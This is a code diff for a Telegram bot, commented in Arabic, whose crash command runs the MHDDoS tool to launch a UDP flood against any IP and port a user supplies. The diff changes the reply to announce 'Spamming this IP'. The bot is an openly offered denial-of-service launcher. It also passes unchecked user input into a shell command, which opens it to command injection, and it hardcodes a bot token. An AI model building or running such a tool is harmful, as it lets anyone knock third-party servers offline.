@@ -1,7 +1,7 @@
 import telebot
 import os
 
-# هنا حط التوكن تا البوت تاعك
+# هنا حط التوكن تاع البوت تاعك
 TOKEN = "7109397811:AAGGULNr7b8I0ldq5DS4NJytZ7RSRyF389k"
 bot = telebot.TeleBot(TOKEN)
 
@@ -30,8 +30,9 @@ def handle_crash_command(message):
         command = f'python3 /workspaces/MHDDoS/start.py UDP {ip}:{port} 100 999'
         os.system(command)
 
-        # الرد على المستخدم
-        bot.reply_to(message, f"بدأت العملية على {ip}:{port}")
+        # الرد على المستخدم بالرسالة المطلوبة
+        response_message = f"Spamming this IP ===> {ip}:{port} for 900 seconds"
+        bot.reply_to(message, response_message)
     except Exception as e:
         bot.reply_to(message, f"صارت مشكلة: {str(e)}")
 
